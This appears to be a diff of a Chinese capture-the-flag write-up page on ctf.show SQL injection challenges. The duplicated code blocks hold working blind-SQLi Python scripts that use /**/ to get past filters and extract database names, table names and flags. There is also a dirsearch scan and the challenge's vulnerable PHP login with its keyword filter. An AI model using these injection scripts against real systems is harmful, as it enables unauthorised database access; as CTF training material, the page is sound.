-<span id="cb14-5"><a href="#cb14-5" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb14-6"><a href="#cb14-6" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> db(url):  <span class="co"># 爆库名</span></span>
-<span id="cb14-7"><a href="#cb14-7" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">1</span>, <span class="dv">5</span>):</span>
-<span id="cb14-8"><a href="#cb14-8" aria-hidden="true" tabindex="-1"></a>        <span class="cf">for</span> j <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">32</span>, <span class="dv">128</span>):</span>
-<span id="cb14-9"><a href="#cb14-9" aria-hidden="true" tabindex="-1"></a>            u <span class="op">=</span> <span class="st">&quot;or/**/ascii(substr(database()/**/from/**/&quot;</span> <span class="op">+</span> <span class="op">\</span></span>
-<span id="cb14-10"><a href="#cb14-10" aria-hidden="true" tabindex="-1"></a>                <span class="bu">str</span>(i)<span class="op">+</span><span class="st">&quot;/**/for/**/1))=&quot;</span><span class="op">+</span><span class="bu">str</span>(j)<span class="op">+</span><span class="st">&quot;#&quot;</span></span>
-<span id="cb14-11"><a href="#cb14-11" aria-hidden="true" tabindex="-1"></a>            s <span class="op">=</span> url<span class="op">+</span>u</span>
-<span id="cb14-12"><a href="#cb14-12" aria-hidden="true" tabindex="-1"></a>            <span class="bu">print</span>(s)</span>
-<span id="cb14-13"><a href="#cb14-13" aria-hidden="true" tabindex="-1"></a>            r <span class="op">=</span> requests.get(s)</span>
-<span id="cb14-14"><a href="#cb14-14" aria-hidden="true" tabindex="-1"></a>            <span class="cf">if</span> <span class="st">&#39;By Rudyard Kipling&#39;</span> <span class="kw">in</span> r.text:</span>
-<span id="cb14-15"><a href="#cb14-15" aria-hidden="true" tabindex="-1"></a>                <span class="bu">print</span>(<span class="bu">chr</span>(j))</span>
-<span id="cb14-16"><a href="#cb14-16" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb14-17"><a href="#cb14-17" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb14-18"><a href="#cb14-18" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> table(url):  <span class="co"># 爆表名</span></span>
-<span id="cb14-19"><a href="#cb14-19" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">4</span>):</span>
-<span id="cb14-20"><a href="#cb14-20" aria-hidden="true" tabindex="-1"></a>        table_name <span class="op">=</span> <span class="st">&#39;&#39;</span></span>
-<span id="cb14-21"><a href="#cb14-21" aria-hidden="true" tabindex="-1"></a>        <span class="cf">for</span> j <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">1</span>, <span class="dv">6</span>):</span>
-<span id="cb14-22"><a href="#cb14-22" aria-hidden="true" tabindex="-1"></a>            <span class="cf">for</span> k <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">48</span>, <span class="dv">128</span>):</span>
-<span id="cb14-23"><a href="#cb14-23" aria-hidden="true" tabindex="-1"></a>                u <span class="op">=</span> <span class="bu">id</span> <span class="op">=</span> <span class="st">&quot;||/**/ascii(substr((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/1/**/offset/**/&quot;</span><span class="op">+</span><span class="bu">str</span>(</span>
-<span id="cb14-24"><a href="#cb14-24" aria-hidden="true" tabindex="-1"></a>                    i)<span class="op">+</span><span class="st">&quot;)/**/from/**/&quot;</span><span class="op">+</span><span class="bu">str</span>(j)<span class="op">+</span><span class="st">&quot;/**/for/**/1))=&quot;</span><span class="op">+</span><span class="bu">str</span>(k)<span class="op">+</span><span class="st">&quot;#&quot;</span></span>
-<span id="cb14-25"><a href="#cb14-25" aria-hidden="true" tabindex="-1"></a>                s <span class="op">=</span> url<span class="op">+</span>u</span>
-<span id="cb14-26"><a href="#cb14-26" aria-hidden="true" tabindex="-1"></a>                <span class="bu">print</span>(s)</span>
-<span id="cb14-27"><a href="#cb14-27" aria-hidden="true" tabindex="-1"></a>                r <span class="op">=</span> requests.get(s)</span>
-<span id="cb14-28"><a href="#cb14-28" aria-hidden="true" tabindex="-1"></a>                <span class="cf">if</span> <span class="st">&#39;By Rudyard Kipling&#39;</span> <span class="kw">in</span> r.text:</span>
-<span id="cb14-29"><a href="#cb14-29" aria-hidden="true" tabindex="-1"></a>                    table_name <span class="op">+=</span> <span class="bu">chr</span>(k)</span>
-<span id="cb14-30"><a href="#cb14-30" aria-hidden="true" tabindex="-1"></a>            <span class="bu">print</span>(table_name)</span>
-<span id="cb14-31"><a href="#cb14-31" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb14-32"><a href="#cb14-32" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb14-33"><a href="#cb14-33" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> main():</span>
-<span id="cb14-34"><a href="#cb14-34" aria-hidden="true" tabindex="-1"></a>    db(url)</span>
-<span id="cb14-35"><a href="#cb14-35" aria-hidden="true" tabindex="-1"></a>    table(url)</span>
-<span id="cb14-36"><a href="#cb14-36" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb14-37"><a href="#cb14-37" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb14-38"><a href="#cb14-38" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">&#39;__main__&#39;</span>:</span>
-<span id="cb14-39"><a href="#cb14-39" aria-hidden="true" tabindex="-1"></a>    main()</span></code></pre></div>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">
+<span class="token keyword">import</span> requests
+url <span class="token operator">=</span> <span class="token string">"http://124.156.121.112:28069/?id=-1'/**/"</span>
+
+
+<span class="token keyword">def</span> <span class="token function">db</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 爆库名</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            u <span class="token operator">=</span> <span class="token string">"or/**/ascii(substr(database()/**/from/**/"</span> <span class="token operator">+</span> \
+                <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/**/for/**/1))="</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"#"</span>
+            s <span class="token operator">=</span> url<span class="token operator">+</span>u
+            <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
+            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
+            <span class="token keyword">if</span> <span class="token string">'By Rudyard Kipling'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+
+<span class="token keyword">def</span> <span class="token function">table</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 爆表名</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        table_name <span class="token operator">=</span> <span class="token string">''</span>
+        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                u <span class="token operator">=</span> <span class="token builtin">id</span> <span class="token operator">=</span> <span class="token string">"||/**/ascii(substr((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/1/**/offset/**/"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>
+                    i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">")/**/from/**/"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/**/for/**/1))="</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"#"</span>
+                s <span class="token operator">=</span> url<span class="token operator">+</span>u
+                <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
+                r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
+                <span class="token keyword">if</span> <span class="token string">'By Rudyard Kipling'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+                    table_name <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span>
+
+
+<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    db<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+    table<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <ul>
 <li>没成功，这个响应报文的字符串为什么是用程序中那个，我的运行，没有打印出数据库名的任何一个字符。</li>
 </ul></li>
@@ -971,37 +958,36 @@ error</strong>；逗号（在函数中间隔参数）也被过滤：可以使用
 <li><p>有回显：爆出全部文章<img
 src="https://s2.loli.net/2023/02/28/I68TAYmO7pvVHyW.png"
 alt="image-20230228113555016" /></p>
-<div class="sourceCode" id="cb15"><pre
-class="sourceCode python"><code class="sourceCode python"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> requests</span>
-<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a>url <span class="op">=</span> <span class="st">&#39;http://d664d69e-0da3-45b0-9170-12b4af6cfca9.challenge.ctf.show/index.php?id=-1/**/or/**/&#39;</span></span>
-<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a>name <span class="op">=</span> <span class="st">&#39;&#39;</span></span>
-<span id="cb15-5"><a href="#cb15-5" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb15-6"><a href="#cb15-6" aria-hidden="true" tabindex="-1"></a><span class="co"># 循环45次( 循环次数按照返回的字符串长度自定义)</span></span>
-<span id="cb15-7"><a href="#cb15-7" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">1</span>, <span class="dv">45</span>):</span>
-<span id="cb15-8"><a href="#cb15-8" aria-hidden="true" tabindex="-1"></a>    <span class="co"># 获取当前使用的数据库</span></span>
-<span id="cb15-9"><a href="#cb15-9" aria-hidden="true" tabindex="-1"></a>    <span class="co"># payload = &#39;ascii(substr(database()from/**/%d/**/for/**/1))=%d&#39;</span></span>
-<span id="cb15-10"><a href="#cb15-10" aria-hidden="true" tabindex="-1"></a>    <span class="co"># 获取当前数据库的所有表</span></span>
-<span id="cb15-11"><a href="#cb15-11" aria-hidden="true" tabindex="-1"></a>    <span class="co"># payload = &#39;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%d/**/for/**/1))=%d&#39;</span></span>
-<span id="cb15-12"><a href="#cb15-12" aria-hidden="true" tabindex="-1"></a>    <span class="co"># 获取flag表的字段</span></span>
-<span id="cb15-13"><a href="#cb15-13" aria-hidden="true" tabindex="-1"></a>    <span class="co"># payload = &#39;ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%d/**/for/**/1))=%d&#39;</span></span>
-<span id="cb15-14"><a href="#cb15-14" aria-hidden="true" tabindex="-1"></a>    <span class="co"># 获取flag表的数据</span></span>
-<span id="cb15-15"><a href="#cb15-15" aria-hidden="true" tabindex="-1"></a>    payload <span class="op">=</span> <span class="st">&#39;ascii(substr((select/**/flag/**/from/**/flag)from/**/</span><span class="sc">%d</span><span class="st">/**/for/**/1))=</span><span class="sc">%d</span><span class="st">&#39;</span></span>
-<span id="cb15-16"><a href="#cb15-16" aria-hidden="true" tabindex="-1"></a>    count <span class="op">=</span> <span class="dv">0</span></span>
-<span id="cb15-17"><a href="#cb15-17" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(<span class="st">&#39;正在获取第 </span><span class="sc">%d</span><span class="st"> 个字符&#39;</span> <span class="op">%</span> i)</span>
-<span id="cb15-18"><a href="#cb15-18" aria-hidden="true" tabindex="-1"></a>    <span class="co"># 截取SQL查询结果的每个字符, 并判断字符内容</span></span>
-<span id="cb15-19"><a href="#cb15-19" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> j <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">31</span>, <span class="dv">128</span>):</span>
-<span id="cb15-20"><a href="#cb15-20" aria-hidden="true" tabindex="-1"></a>        result <span class="op">=</span> requests.get(url <span class="op">+</span> payload <span class="op">%</span> (i, j))</span>
-<span id="cb15-21"><a href="#cb15-21" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb15-22"><a href="#cb15-22" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="st">&#39;If&#39;</span> <span class="kw">in</span> result.text:</span>
-<span id="cb15-23"><a href="#cb15-23" aria-hidden="true" tabindex="-1"></a>            name <span class="op">+=</span> <span class="bu">chr</span>(j)</span>
-<span id="cb15-24"><a href="#cb15-24" aria-hidden="true" tabindex="-1"></a>            <span class="bu">print</span>(<span class="st">&#39;数据库名/表名/字段名/数据: </span><span class="sc">%s</span><span class="st">&#39;</span> <span class="op">%</span> name)</span>
-<span id="cb15-25"><a href="#cb15-25" aria-hidden="true" tabindex="-1"></a>            <span class="cf">break</span></span>
-<span id="cb15-26"><a href="#cb15-26" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb15-27"><a href="#cb15-27" aria-hidden="true" tabindex="-1"></a>        <span class="co"># 如果某个字符不存在,则停止程序</span></span>
-<span id="cb15-28"><a href="#cb15-28" aria-hidden="true" tabindex="-1"></a>        count <span class="op">+=</span> <span class="dv">1</span></span>
-<span id="cb15-29"><a href="#cb15-29" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> count <span class="op">&gt;=</span> (<span class="dv">128</span> <span class="op">-</span> <span class="dv">31</span>):</span>
-<span id="cb15-30"><a href="#cb15-30" aria-hidden="true" tabindex="-1"></a>            exit()</span></code></pre></div>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+ 
+url <span class="token operator">=</span> <span class="token string">'http://d664d69e-0da3-45b0-9170-12b4af6cfca9.challenge.ctf.show/index.php?id=-1/**/or/**/'</span>
+name <span class="token operator">=</span> <span class="token string">''</span>
+ 
+<span class="token comment"># 循环45次( 循环次数按照返回的字符串长度自定义)</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment"># 获取当前使用的数据库</span>
+    <span class="token comment"># payload = 'ascii(substr(database()from/**/%d/**/for/**/1))=%d'</span>
+    <span class="token comment"># 获取当前数据库的所有表</span>
+    <span class="token comment"># payload = 'ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%d/**/for/**/1))=%d'</span>
+    <span class="token comment"># 获取flag表的字段</span>
+    <span class="token comment"># payload = 'ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%d/**/for/**/1))=%d'</span>
+    <span class="token comment"># 获取flag表的数据</span>
+    payload <span class="token operator">=</span> <span class="token string">'ascii(substr((select/**/flag/**/from/**/flag)from/**/%d/**/for/**/1))=%d'</span>
+    count <span class="token operator">=</span> <span class="token number">0</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'正在获取第 %d 个字符'</span> <span class="token operator">%</span> i<span class="token punctuation">)</span>
+    <span class="token comment"># 截取SQL查询结果的每个字符, 并判断字符内容</span>
+    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        result <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">)</span>
+ 
+        <span class="token keyword">if</span> <span class="token string">'If'</span> <span class="token keyword">in</span> result<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+            name <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'数据库名/表名/字段名/数据: %s'</span> <span class="token operator">%</span> name<span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+ 
+        <span class="token comment"># 如果某个字符不存在,则停止程序</span>
+        count <span class="token operator">+=</span> <span class="token number">1</span>
+        <span class="token keyword">if</span> count <span class="token operator">>=</span> <span class="token punctuation">(</span><span class="token number">128</span> <span class="token operator">-</span> <span class="token number">31</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><strong>Code解析</strong>：</p>
 <ul>
 <li><p>ASCII码表中的<strong>可打印字符</strong>位于31到127之间</p></li>
@@ -1037,14 +1023,12 @@ alt="image-20230514233401671" /></p></li>
 <li><strong>dirsearch</strong> ：<a
 target="_blank" rel="noopener" href="https://github.com/maurosoria/dirsearch#wordlists-important">目录扫描工具安装</a></li>
 </ol>
-<div class="sourceCode" id="cb16"><pre
-class="sourceCode bash"><code class="sourceCode bash"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="ex">1.</span> Install with git: git clone https://github.com/maurosoria/dirsearch.git <span class="at">--depth</span> 1 <span class="er">(</span><span class="ex">RECOMMENDED</span><span class="kw">)</span></span>
-<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a><span class="ex">2.</span> cd dirsearch </span></code></pre></div>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">1</span>. Install with git: <span class="token function">git</span> clone https://github.com/maurosoria/dirsearch.git <span class="token parameter variable">--depth</span> <span class="token number">1</span> <span class="token punctuation">(</span>RECOMMENDED<span class="token punctuation">)</span>
+
+<span class="token number">2</span>. <span class="token builtin class-name">cd</span> dirsearch <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <ol start="2" type="1">
 <li><p>扫描</p>
-<div class="sourceCode" id="cb17"><pre
-class="sourceCode bash"><code class="sourceCode bash"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="ex">3.</span> dirsearch <span class="at">-u</span> http://4773abe8-15a4-4d51-b0f1-d0c4b64b55ba.challenge.ctf.show/</span></code></pre></div>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">3</span>. dirsearch <span class="token parameter variable">-u</span> http://4773abe8-15a4-4d51-b0f1-d0c4b64b55ba.challenge.ctf.show/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><strong>扫描结果</strong>：<img
 src="https://s2.loli.net/2023/05/15/SinHDeGdMIUVx9j.png"
 alt="image-20230515011856443" />这是一个 <code>robots.txt</code>
@@ -1075,40 +1059,38 @@ or 一个永真式，因此相当于万能密码，可以绕过md5()函数。</p
 <li><p><code>$regex = "/(select|from|where|join|sleep|and|\s|union|,)/i";</code>
 从源码中可以得知几乎把注入用到的关键词过滤的差不多了。
 如果只有这一条现在可以采用双写绕过，但是下面这条限制，使得无法<strong>双写</strong>绕过</p>
-<div class="sourceCode" id="cb18"><pre
-class="sourceCode php"><code class="sourceCode php"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span>(<span class="fu">strlen</span>(<span class="va">$username</span>)<span class="op">!=</span><span class="fu">strlen</span>(replaceSpecialChar(<span class="va">$username</span>)))&#123;</span>
-<span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a>         <span class="cf">die</span>(<span class="st">&quot;sql inject error&quot;</span>)<span class="ot">;</span></span>
-<span id="cb18-3"><a href="#cb18-3" aria-hidden="true" tabindex="-1"></a>     &#125;</span></code></pre></div></li>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token function">replaceSpecialChar</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+			<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sql inject error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
 <li><p>点击<strong>取消</strong>按钮、获得php文件</p>
-<div class="sourceCode" id="cb19"><pre
-class="sourceCode php"><code class="sourceCode php"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;?php</span></span>
-<span id="cb19-2"><a href="#cb19-2" aria-hidden="true" tabindex="-1"></a>     <span class="va">$flag</span><span class="op">=</span><span class="st">&quot;&quot;</span><span class="ot">;</span></span>
-<span id="cb19-3"><a href="#cb19-3" aria-hidden="true" tabindex="-1"></a>        <span class="kw">function</span> replaceSpecialChar(<span class="va">$strParam</span>)&#123;</span>
-<span id="cb19-4"><a href="#cb19-4" aria-hidden="true" tabindex="-1"></a>             <span class="va">$regex</span> <span class="op">=</span> <span class="st">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span><span class="ot">;</span></span>
-<span id="cb19-5"><a href="#cb19-5" aria-hidden="true" tabindex="-1"></a>             <span class="cf">return</span> <span class="fu">preg_replace</span>(<span class="va">$regex</span><span class="ot">,</span><span class="st">&quot;&quot;</span><span class="ot">,</span><span class="va">$strParam</span>)<span class="ot">;</span></span>
-<span id="cb19-6"><a href="#cb19-6" aria-hidden="true" tabindex="-1"></a>        &#125;</span>
-<span id="cb19-7"><a href="#cb19-7" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> (<span class="op">!</span><span class="va">$con</span>)</span>
-<span id="cb19-8"><a href="#cb19-8" aria-hidden="true" tabindex="-1"></a>        &#123;</span>
-<span id="cb19-9"><a href="#cb19-9" aria-hidden="true" tabindex="-1"></a>            <span class="cf">die</span>(<span class="st">&#39;Could not connect: &#39;</span> <span class="op">.</span> <span class="fu">mysqli_error</span>())<span class="ot">;</span></span>
-<span id="cb19-10"><a href="#cb19-10" aria-hidden="true" tabindex="-1"></a>        &#125;</span>
-<span id="cb19-11"><a href="#cb19-11" aria-hidden="true" tabindex="-1"></a>     <span class="cf">if</span>(<span class="fu">strlen</span>(<span class="va">$username</span>)<span class="op">!=</span><span class="fu">strlen</span>(replaceSpecialChar(<span class="va">$username</span>)))&#123;</span>
-<span id="cb19-12"><a href="#cb19-12" aria-hidden="true" tabindex="-1"></a>         <span class="cf">die</span>(<span class="st">&quot;sql inject error&quot;</span>)<span class="ot">;</span></span>
-<span id="cb19-13"><a href="#cb19-13" aria-hidden="true" tabindex="-1"></a>     &#125;</span>
-<span id="cb19-14"><a href="#cb19-14" aria-hidden="true" tabindex="-1"></a>     <span class="cf">if</span>(<span class="fu">strlen</span>(<span class="va">$password</span>)<span class="op">!=</span><span class="fu">strlen</span>(replaceSpecialChar(<span class="va">$password</span>)))&#123;</span>
-<span id="cb19-15"><a href="#cb19-15" aria-hidden="true" tabindex="-1"></a>         <span class="cf">die</span>(<span class="st">&quot;sql inject error&quot;</span>)<span class="ot">;</span></span>
-<span id="cb19-16"><a href="#cb19-16" aria-hidden="true" tabindex="-1"></a>     &#125;</span>
-<span id="cb19-17"><a href="#cb19-17" aria-hidden="true" tabindex="-1"></a>     <span class="va">$sql</span><span class="op">=</span><span class="st">&quot;select * from user where username = &#39;</span><span class="va">$username</span><span class="st">&#39;&quot;</span><span class="ot">;</span></span>
-<span id="cb19-18"><a href="#cb19-18" aria-hidden="true" tabindex="-1"></a>     <span class="va">$result</span><span class="op">=</span><span class="fu">mysqli_query</span>(<span class="va">$con</span><span class="ot">,</span><span class="va">$sql</span>)<span class="ot">;</span></span>
-<span id="cb19-19"><a href="#cb19-19" aria-hidden="true" tabindex="-1"></a>         <span class="cf">if</span>(<span class="fu">mysqli_num_rows</span>(<span class="va">$result</span>)<span class="op">&gt;</span><span class="dv">0</span>)&#123;</span>
-<span id="cb19-20"><a href="#cb19-20" aria-hidden="true" tabindex="-1"></a>                 <span class="cf">while</span>(<span class="va">$row</span><span class="op">=</span><span class="fu">mysqli_fetch_assoc</span>(<span class="va">$result</span>))&#123;</span>
-<span id="cb19-21"><a href="#cb19-21" aria-hidden="true" tabindex="-1"></a>                     <span class="cf">if</span>(<span class="va">$password</span><span class="op">==</span><span class="va">$row</span>[<span class="st">&#39;password&#39;</span>])&#123;</span>
-<span id="cb19-22"><a href="#cb19-22" aria-hidden="true" tabindex="-1"></a>                         <span class="kw">echo</span> <span class="st">&quot;登陆成功&lt;br&gt;&quot;</span><span class="ot">;</span></span>
-<span id="cb19-23"><a href="#cb19-23" aria-hidden="true" tabindex="-1"></a>                         <span class="kw">echo</span> <span class="va">$flag</span><span class="ot">;</span></span>
-<span id="cb19-24"><a href="#cb19-24" aria-hidden="true" tabindex="-1"></a>                     &#125;</span>
-<span id="cb19-25"><a href="#cb19-25" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb19-26"><a href="#cb19-26" aria-hidden="true" tabindex="-1"></a>                  &#125;</span>
-<span id="cb19-27"><a href="#cb19-27" aria-hidden="true" tabindex="-1"></a>         &#125;</span>
-<span id="cb19-28"><a href="#cb19-28" aria-hidden="true" tabindex="-1"></a>    <span class="kw">?&gt;</span></span></code></pre></div>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+		<span class="token variable">$flag</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
+        <span class="token keyword">function</span> <span class="token function-definition function">replaceSpecialChar</span><span class="token punctuation">(</span><span class="token variable">$strParam</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+             <span class="token variable">$regex</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/(select|from|where|join|sleep|and|\s|union|,)/i"</span><span class="token punctuation">;</span>
+             <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$regex</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$strParam</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$con</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Could not connect: '</span> <span class="token operator">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
